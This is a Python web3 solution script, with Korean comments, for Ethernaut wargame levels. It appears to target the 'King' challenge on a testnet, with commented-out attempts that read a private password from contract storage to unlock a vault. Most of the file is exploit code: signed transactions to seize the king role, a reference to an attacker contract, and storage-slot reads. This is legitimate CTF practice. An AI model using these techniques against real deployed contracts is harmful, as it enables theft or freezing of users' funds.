from web3 import Web3

# 풀이
# 1. 

# 문제에서 사용하는 각종 정보 추출
def parse_env_to_dict(env_file_path):
    env_dict = {}

    # Read the .env file line by line
    with open(env_file_path, "r") as file:
        for line in file:
            # Strip whitespace and ignore comments or empty lines
            line = line.strip()
            if not line or line.startswith("#"):
                continue

            # Split key and value on the first '='
            key, _, value = line.partition("=")
            key = key.strip()
            value = value.strip()

            # Remove quotes from the value if present
            if (value.startswith('"') and value.endswith('"')) or (value.startswith("'") and value.endswith("'")):
                value = value[1:-1]

            # Add to dictionary
            env_dict[key] = value

    return env_dict

ENV_PATH = "../.env"

dict_output = parse_env_to_dict(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x359e5f9C357705d007b20f9cF6bb683844D79e27'
ATTACKER_ADDRESS = '0x89BCC50E6D563b282CF895AA699a4F268D4FC94a'
MAIN_ADDRESS = '0x' + dict_output['ETHERNAUT_MAIN_ADDRESS']
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL09_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['FIRST_USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Seth!")
else:
    print("Failed to connect to Seth.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [],
        "stateMutability": "payable",
        "payable": True
    },
    {
        "type": "receive",
        "stateMutability": "payable",
        "payable": True
    },
    {
        "type": "function",
        "name": "_king",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x29cc6d6f"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    },
    {
        "type": "function",
        "name": "prize",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xe3ac5d26"
    }
]

ATTACKER_ABI = [
  {
    "inputs": [
      {
        "internalType": "contract King",
        "name": "_kingContract",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "attack",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  }
]

#main = web3.eth.contract(address=MAIN_ADDRESS, abi=MAIN_ABI)
contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

print(contract.functions.prize().call())

for i in range(1, 11):
    data = {
        'to': CONTRACT_ADDRESS,
        'value': web3.to_wei(0.0011111 + 0.00000001 * i, 'ether'),
        'gas': 300000,
        'gasPrice': web3.eth.gas_price,
        'nonce': web3.eth.get_transaction_count(USER_ADDRESS) + (i - 1),
        'chainId': web3.eth.chain_id,
    }

    # 트랜젝션 서명 및 전송
    signed_tx = web3.eth.account.sign_transaction(data, PRIVATE_KEY)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

    print(f"Transaction Hash: {web3.to_hex(tx_hash)}")



'''
data = {
    'value': web3.to_wei(0.001, 'ether'),
    'gas': web3.to_wei("0.000000000001", 'ether'),
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
    'chainId': web3.eth.chain_id,
}

tx = main.functions.createLevelInstance(LEVEL_ADDRESS).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}")
'''
'''
OWNER = contract.functions.owner().call()
KING = contract.functions._king().call()

if OWNER == USER_ADDRESS:
    print(f"Current Ownwer: {USER_ADDRESS}")
    print("Already pwned.")
    exit(0)
else:
    print(f"Current Ownwer: {OWNER}")

if KING != USER_ADDRESS:
    print(f"Current King: {KING}")

    PRIZE = contract.functions.prize().call()
    PRIZE_TO_ETHER = web3.from_wei(PRIZE, 'ether')

    print(f"Current prize: {PRIZE} ({PRIZE_TO_ETHER} ether)")

    data = {
        'value': web3.to_wei(PRIZE, 'ether') + 1,
        'gas': web3.to_wei("0.000000000001", 'ether'),
        'gasPrice': web3.eth.gas_price,
        'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
        'chainId': web3.eth.chain_id,
    }

    # 트랜젝션 서명 및 전송
    signed_tx = web3.eth.account.sign_transaction(data, USER_PRIVATE_KEY)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

    print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

    # 트랜잭션 결과 확인
    tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
    print(f"Transaction Receipt: {tx_receipt}")
else:
    print(f"Current King: {USER_ADDRESS}")
'''

'''
# get_storage_at 변수를 이용해서 Private Variable 접근
PASSWORD = web3.eth.get_storage_at(CONTRACT_ADDRESS, 1)

print(f"Password : {PASSWORD}")

# 앞서 구한 Password 정보를 이용하여 unlock 함수 실행
data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = contract.functions.unlock(PASSWORD).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}")

result = contract.functions.locked().call()

if result == False:
    print("Stage Cleared!")
else:
    print("Stage Failed... Try Again...")
'''